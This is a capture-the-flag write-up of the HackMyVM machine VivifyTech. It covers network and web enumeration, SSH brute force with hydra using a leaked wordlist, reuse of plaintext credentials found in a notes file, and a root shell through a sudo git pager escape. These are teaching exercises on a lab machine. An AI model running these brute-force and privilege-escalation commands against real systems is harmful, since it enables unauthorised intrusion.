---
title: Write-up VivifyTech on HackMyVM
author: eMVee
date: 2023-12-28 14:00:00 +0800
categories: [CTF, HackMyVM]
tags: [HackMyVM, OSCP, feroxbuster, dirsearch, hydra, sudo, git]
render_with_liquid: false
---

VivifyTech an easy machine from [Sancelisso](https://sancelisso.github.io/) was released today on [HackMyVM](https://downloads.hackmyvm.eu/vivifytech.zip). This machine is an awesome machine for beginners to learn the basics of enumerating. Most often enumerating is key in hacking a machine. In this write up I describe my approach on this machine.

## Getting started
Before we start we have to change the working directory to the project directory of the machine. In this directory we can store any information related to the target.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HMV/VivifyTech 
```
One of the first steps we should do is check our own IP address. This might be useful if we have to create are verse shell or we have to transfer files.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/VivifyTech]
└─$ ip a        
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:0e:ca:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 481sec preferred_lft 481sec
    inet6 fe80::a00:27ff:fe0e:cae6/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:52:b2:18:50 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
```
To identify the target on our virtual network we can run fping to create a list with all IP addresses on our subnet.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/VivifyTech]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.37
```
We should assign the IP address to a variable and execute a ping request against our target.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/VivifyTech]
└─$ ip=10.0.2.37

┌──(emvee㉿kali)-[~/Documents/HMV/VivifyTech]
└─$ ping -c 3 $ip
PING 10.0.2.37 (10.0.2.37) 56(84) bytes of data.
64 bytes from 10.0.2.37: icmp_seq=1 ttl=64 time=0.449 ms
64 bytes from 10.0.2.37: icmp_seq=2 ttl=64 time=0.752 ms
64 bytes from 10.0.2.37: icmp_seq=3 ttl=64 time=1.11 ms

--- 10.0.2.37 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2059ms
rtt min/avg/max/mdev = 0.449/0.771/1.113/0.271 ms
```
Based on the value in the ttl field, we could indicate that this machine is running on a Linux operating system.
## Enumeration
We should start enumerating open ports and service. We can do this by running nmap against our target.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/VivifyTech]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-28 10:25 CET
Nmap scan report for 10.0.2.37
Host is up (0.00080s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 32:f3:f6:36:95:12:c8:18:f3:ad:b8:0f:04:4d:73:2f (ECDSA)
|_  256 1d:ec:9c:6e:3c:cf:83:f6:f0:45:22:58:13:2f:d3:9e (ED25519)
80/tcp    open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94%I=7%D=12/28%Time=658D3F0B%P=x86_64-pc-linux-gnu%r(
SF:NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPO
SF:ptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVer
SF:sionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,
SF:2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0f
SF:Invalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0"
SF:)%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x0
SF:1\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCooki
SF:e,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\
SF:"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05
SF:\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY
SF:000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01
SF:\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20m
SF:essage\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LA
SF:NDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesR
SF:PC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\
SF:x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,
SF:"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invali
SF:d\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x1
SF:0\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
MAC Address: 08:00:27:FC:BF:25 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.80 ms 10.0.2.37

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.86 seconds
```

After running nmap we have some information found what should be added to our notes. So let's add them to our notes:
- Linux, probably a Debian linux
- Port 22
	- SSH
	-  OpenSSH 9.2p1
- Port 80
	- HTTP
	- Apache 2.4.57
	- Title:  Apache2 Debian Default Page: It works
- Port 3306
	- MySQL
- Port 33060
	- MySQL, probably note sure

Let's enumerate the HTTP service with whatweb to see if we can find anything else.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/VivifyTech]
└─$ whatweb http://$ip
http://10.0.2.37 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[10.0.2.37], Title[Apache2 Debian Default Page: It works]
```
Nothing much is found with whatweb. We can try to enumerate some directories on the server to see if there is anything else on the server running. To search for directories we can use dirsearch.
```
┌──(emvee㉿kali)-[~/Documents/HMV/VivifyTech]
└─$ dirsearch -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e html,php,txt

  _|. _ _  _  _  _ _|_    v0.4.2                                                         
  (_||| _) (/_(_|| (_| )                                                                                            
Extensions: html, php, txt | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/emvee/.dirsearch/reports/10.0.2.37/_23-12-28_10-27-24.txt

Error Log: /home/emvee/.dirsearch/logs/errors-23-12-28_10-27-24.log

Target: http://10.0.2.37/

[10:27:24] Starting: 
[10:27:25] 301 -  310B  - /wordpress  ->  http://10.0.2.37/wordpress/      
CTRL+C detected: Pausing threads, please wait...                             
[q]uit / [c]ontinue: q                                                     
 
Canceled by the user

```
We have found a `wordpress` directory. Let's check it quickly in the browser.

![image](/assets/img/WriteUp/HackMyVM/VivifyTech/Pasted image 20231228140404.png){: width="700" height="400" }

Let's try to enumerate directories and files in the wordpress directory with feroxbuster.
Since feroxbuster is fast and a lot of information is shown it is a good idea to write it to a file so we can scroll through the results. 
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/VivifyTech]
└─$ feroxbuster -u http://10.0.2.37/wordpress -x txt -s 200 > feroxbuster.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.0.2.37/wordpress
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
```
The output is stored in feroxbuster.txt and with Visual Code we can scroll through the results.
```
┌──(emvee㉿kali)-[~/Documents/HMV/VivifyTech]
└─$ code feroxbuster.txt                                                     
┏━(Message from Kali developers)
┃ code is not the binary you may be expecting.
┃ You are looking for \"code-oss\"
┃ Starting code-oss for you...
┗━

```

![image](/assets/img/WriteUp/HackMyVM/VivifyTech/Pasted image 20231228144845.png){: width="700" height="400" }

There is a secrets.txt file found in the `wp-includes` directory. Let's find out what is stored in this file with curl.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/VivifyTech]
└─$ curl http://$ip/wordpress/wp-includes/secrets.txt
agonglo
tegbesou
paparazzi
womenintech
Password123
bohicon
agodjie
tegbessou
Oba
IfÃ¨
Abomey
Gelede
BeninCity
Oranmiyan
Zomadonu
Ewuare
Brass
Ahosu
Igodomigodo
Edaiken
Olokun
Iyoba
Agasu
Uzama
IhaOminigbon
Agbado
OlokunFestival
Ovoranmwen
Eghaevbo
EwuareII
Egharevba
IgueFestival
Isienmwenro
Ugie-Olokun
Olokunworship
Ukhurhe
OsunRiver
Uwangue
miammiam45
Ewaise
Iyekowa
Idia
Olokunmask
Emotan
OviaRiver
Olokunceremony
Akenzua
Edoculture

```
It looks like we have a kind of dictionary file. We should download the file to our working directory.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/VivifyTech]
└─$ curl http://$ip/wordpress/wp-includes/secrets.txt -o secrets.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   439  100   439    0     0   208k      0 --:--:-- --:--:-- --:--:--  214k

```
 On the website we saw a post with the title: 'The story behind VivifyTech'. We should gather all names in this article since they could be potential usernames.

![image](/assets/img/WriteUp/HackMyVM/VivifyTech/Pasted image 20231228133549.png){: width="700" height="400" }

Now we should create a user list so we can brute force against the SSH service with Hydra.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/VivifyTech]
└─$ nano users 

┌──(emvee㉿kali)-[~/Documents/HMV/VivifyTech]
└─$ cat users                  
sarah
mark
emily
jake
alex
sancelisso
```


We got now a two files with potential usernames and passwords. Since there was a SSH service running on port 22 we could try to brute force it with Hydra.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/VivifyTech]
└─$ hydra ssh://$ip -L users  -P secrets.txt -I
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-28 11:31:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 288 login tries (l:6/p:48), ~18 tries per task
[DATA] attacking ssh://10.0.2.37:22/
[22][ssh] host: 10.0.2.37   login: sarah   password: bohicon
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```
Hydra did found a password for the user sarah. We can stop the brute force attack and gain access to the SSH service.
## Initial access
Let's connect as sarah to the SSH service.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/VivifyTech]
└─$ ssh sarah@$ip                      
The authenticity of host '10.0.2.37 (10.0.2.37)' can't be established.
ED25519 key fingerprint is SHA256:i4eLII3uzJGiSMrTFLLAnrihC0r7/y6uuO7YMmGF7Rs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.37' (ED25519) to the list of known hosts.
sarah@10.0.2.37's password: 
Linux VivifyTech 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64
#######################################
 #      Welcome to VivifyTech !      #
 #      The place to be :)           #
#######################################
Last login: Tue Dec  5 17:54:16 2023 from 192.168.177.129
sarah@VivifyTech:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:fc:bf:25 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.37/24 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 377sec preferred_lft 377sec
    inet6 fe80::a00:27ff:fefc:bf25/64 scope link 
       valid_lft forever preferred_lft forever
sarah@VivifyTech:~$ whoami
sarah
sarah@VivifyTech:~$ hostname
VivifyTech
sarah@VivifyTech:~$ ls
user.txt
sarah@VivifyTech:~$ cat user.txt 
HERE IS THE USER FLAG
```
First we should check if we can sudo anything with this user.
```bash
sarah@VivifyTech:~$ sudo -l
[sudo] password for sarah: 
Sorry, user sarah may not run sudo on VivifyTech.

```
We are not able to sudo anything as sarah. Let's find out what other juicy information we can gather in all the home directories.

```bash
sarah@VivifyTech:/tmp$ ls /home -ahlR
/home:
total 24K
drwxr-xr-x  6 root   root   4.0K Dec  5 16:00 .
drwxr-xr-x 18 root   root   4.0K Dec  5 10:10 ..
drwx------  2 emily  emily  4.0K Dec  5 16:00 emily
drwx------  3 gbodja gbodja 4.0K Dec  5 17:53 gbodja
drwx------  5 sarah  sarah  4.0K Dec 28 05:35 sarah
drwx------  3 user   user   4.0K Dec  5 17:47 user
ls: cannot open directory '/home/emily': Permission denied
ls: cannot open directory '/home/gbodja': Permission denied

/home/sarah:
total 36K
drwx------ 5 sarah sarah 4.0K Dec 28 05:35 .
drwxr-xr-x 6 root  root  4.0K Dec  5 16:00 ..
-rw------- 1 sarah sarah    0 Dec  5 17:53 .bash_history
-rw-r--r-- 1 sarah sarah  245 Dec  5 17:33 .bash_logout
-rw-r--r-- 1 sarah sarah 3.5K Dec  5 17:48 .bashrc
drwx------ 3 sarah sarah 4.0K Dec 28 05:35 .gnupg
-rw------- 1 sarah sarah    0 Dec  5 17:49 .history
drwxr-xr-x 3 sarah sarah 4.0K Dec  5 16:19 .local
drwxr-xr-x 2 sarah sarah 4.0K Dec  5 16:19 .private
-rw-r--r-- 1 sarah sarah  807 Dec  5 15:57 .profile
-rw-r--r-- 1 sarah sarah   27 Dec  5 16:22 user.txt

/home/sarah/.gnupg:
total 20K
drwx------ 3 sarah sarah 4.0K Dec 28 05:35 .
drwx------ 5 sarah sarah 4.0K Dec 28 05:35 ..
drwx------ 2 sarah sarah 4.0K Dec 28 05:35 private-keys-v1.d
-rw------- 1 sarah sarah   32 Dec 28 05:35 pubring.kbx
-rw------- 1 sarah sarah 1.2K Dec 28 05:35 trustdb.gpg

/home/sarah/.gnupg/private-keys-v1.d:
total 8.0K
drwx------ 2 sarah sarah 4.0K Dec 28 05:35 .
drwx------ 3 sarah sarah 4.0K Dec 28 05:35 ..

/home/sarah/.local:
total 12K
drwxr-xr-x 3 sarah sarah 4.0K Dec  5 16:19 .
drwx------ 5 sarah sarah 4.0K Dec 28 05:35 ..
drwx------ 3 sarah sarah 4.0K Dec  5 16:19 share

/home/sarah/.local/share:
total 12K
drwx------ 3 sarah sarah 4.0K Dec  5 16:19 .
drwxr-xr-x 3 sarah sarah 4.0K Dec  5 16:19 ..
drwx------ 2 sarah sarah 4.0K Dec  5 16:19 nano

/home/sarah/.local/share/nano:
total 8.0K
drwx------ 2 sarah sarah 4.0K Dec  5 16:19 .
drwx------ 3 sarah sarah 4.0K Dec  5 16:19 ..

/home/sarah/.private:
total 12K
drwxr-xr-x 2 sarah sarah 4.0K Dec  5 16:19 .
drwx------ 5 sarah sarah 4.0K Dec 28 05:35 ..
-rw-r--r-- 1 sarah sarah  274 Dec  5 16:19 Tasks.txt
ls: cannot open directory '/home/user': Permission denied
```
There is a file `Tasks.txt` in the hidden directory private. We should inspect this file.

```bash
sarah@VivifyTech:/tmp$ cat /home/sarah/.private/Tasks.txt 
- Change the Design and architecture of the website
- Plan for an audit, it seems like our website is vulnerable
- Remind the team we need to schedule a party before going to holidays
- Give this cred to the new intern for some tasks assigned to him - gbodja:4Tch055ouy370N
```
There are credentials for a new intern in this file. We should use this information to switch user.

## Privilege escalation
With the simple `su` command we can switch the user to the intern.
```bash
sarah@VivifyTech:/tmp$ su gbodja
Password: 
```
Again we should first check if we can sudo anything.
```bash
gbodja@VivifyTech:/tmp$ sudo -l
Matching Defaults entries for gbodja on VivifyTech:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    !admin_flag, use_pty

User gbodja may run the following commands on VivifyTech:
    (ALL) NOPASSWD: /usr/bin/git
```
We can sudo `/usr/bin/git`, this is a known vulnerability and can be exploited as explained on [GTFObins](https://gtfobins.github.io/gtfobins/git/#sudo). To gain extra privileges we can simply follow the instructions on this page.
```bash
gbodja@VivifyTech:/tmp$ sudo /usr/bin/git -p help config
GIT-CONFIG(1)                                       Git Manual                                      GIT-CONFIG(1)

NAME
       git-config - Get and set repository or global options

SYNOPSIS
       git config [<file-option>] [--type=<type>] [--fixed-value] [--show-origin] [--show-scope] [-z|--null] <name> [<value> [<value-pattern>){: width="700" height="400" }

       git config [<file-option>] [--type=<type>] --add <name> <value>
       git config [<file-option>] [--type=<type>] [--fixed-value] --replace-all <name> <value> [<value-pattern>]
       git config [<file-option>] [--type=<type>] [--show-origin] [--show-scope] [-z|--null] [--fixed-value] --get <name> [<value-pattern>]
       git config [<file-option>] [--type=<type>] [--show-origin] [--show-scope] [-z|--null] [--fixed-value] --get-all <name> [<value-pattern>]
       git config [<file-option>] [--type=<type>] [--show-origin] [--show-scope] [-z|--null] [--fixed-value] [--name-only] --get-regexp <name-regex> [<value-pattern>]
       git config [<file-option>] [--type=<type>] [-z|--null] --get-urlmatch <name> <URL>
       git config [<file-option>] [--fixed-value] --unset <name> [<value-pattern>]
       git config [<file-option>] [--fixed-value] --unset-all <name> [<value-pattern>]
       git config [<file-option>] --rename-section <old-name> <new-name>
       git config [<file-option>] --remove-section <name>
       git config [<file-option>] [--show-origin] [--show-scope] [-z|--null] [--name-only] -l | --list
       git config [<file-option>] --get-color <name> [<default>]
       git config [<file-option>] --get-colorbool <name> [<stdout-is-tty>]
       git config [<file-option>] -e | --edit

DESCRIPTION
       You can query/set/replace/unset options with this command. The name is actually the section and the key
       separated by a dot, and the value will be escaped.

       Multiple lines can be added to an option by using the --add option. If you want to update or unset an
       option which can occur on multiple lines, a value-pattern (which is an extended regular expression, unless
       the --fixed-value option is given) needs to be given. Only the existing values that match the pattern are
       updated or unset. If you want to handle the lines that do not match the pattern, just prepend a single
       exclamation mark in front (see also the section called “EXAMPLES”), but note that this only works when the
       --fixed-value option is not in use.

       The --type=<type> option instructs git config to ensure that incoming and outgoing values are
       canonicalize-able under the given <type>. If no --type=<type> is given, no canonicalization will be
       performed. Callers may unset an existing --type specifier with --no-type.

       When reading, the values are read from the system, global and repository local configuration files by
       default, and options --system, --global, --local, --worktree and --file <filename> can be used to tell the
       command to read from only that location (see the section called “FILES”).

       When writing, the new value is written to the repository local configuration file by default, and options
       --system, --global, --worktree, --file <filename> can be used to tell the command to write to that
       location (you can say --local but that is the default).

       This command will fail with non-zero status upon error. Some exit codes are:

!/bin/sh
# 
```
A shell has been spawned. We should check that we are indeed root and capture the root flag.
```bash
# whoami
root
# cat /root/root.txt
HERE IS THE ROOT FLAG

```
